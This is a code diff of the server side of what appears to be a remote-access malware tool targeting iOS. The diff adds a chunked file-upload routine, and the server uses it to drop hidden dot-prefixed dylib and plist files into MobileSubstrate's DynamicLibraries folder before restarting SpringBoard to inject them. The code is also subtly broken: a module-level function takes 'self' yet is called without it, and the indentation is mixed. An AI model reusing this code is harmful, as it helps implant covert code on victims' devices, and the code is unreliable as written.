@@ -1,11 +1,28 @@
 import socket, ssl, os, json, sys
 import helper as h
-import session as session
+import session
 import binascii
 from multihandler import MultiHandler
 import time
 
 downloads_dir = "../downloads"
+
+def upload_file(self,file_path,remote_dir,remote_file_name):
+		term = binascii.hexlify(os.urandom(16))
+		if os.path.exists(file_path):
+			f = open(file_path,"rb")
+			data = f.read()
+			size = len(data)
+			name = os.path.split(file_path)[-1]
+			cmd_data = json.dumps({"cmd":"upload","args":json.dumps({"size":size,"path":remote_dir,"filename":remote_file_name}),"term":term})
+			self.sock_send(cmd_data)
+			for i in range((size / 1024) + 1):
+				deltax = i * 1024
+				chunk = data[deltax:deltax + 1024]
+				self.sock_send(chunk)
+			self.sock_send(term)
+		else:
+			h.info_error("Local file: " + file_path + " does not exist")
 
 class Server:
     def __init__(self):
@@ -119,10 +136,10 @@ class Server:
             self.verbose_print("Detected iOS")
     	    h.info_general("Uploading dylib 1/2...")
             time.sleep(1)
-            session.upload_file("resources/mpl.dylib","/Library/MobileSubstrate/DynamicLibraries",".mpl.dylib")
+            upload_file("resources/mpl.dylib","/Library/MobileSubstrate/DynamicLibraries",".mpl.dylib")
             h.info_general("Uploading plist 2/2...")
             time.sleep(1)
-            session.upload_file("resources/mpl.plist","/Library/MobileSubstrate/DynamicLibraries",".mpl.plist")
+            upload_file("resources/mpl.plist","/Library/MobileSubstrate/DynamicLibraries",".mpl.plist")
             h.info_general("Respring...")
             time.sleep(2)
             session.send_command({"cmd":"killall","args":"SpringBoard"})
